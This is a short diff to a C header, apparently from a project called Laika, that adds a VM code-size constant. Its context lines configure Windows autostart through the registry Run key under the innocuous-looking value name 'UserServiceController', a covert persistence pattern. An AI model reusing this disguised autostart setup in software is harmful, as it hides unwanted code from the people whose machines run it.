@@ -44,4 +44,6 @@
 #define LAIKA_WIN_REG_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define LAIKA_WIN_REG_VAL "UserServiceController"
 
+#define LAIKA_VM_CODESIZE 512
+
 #endif
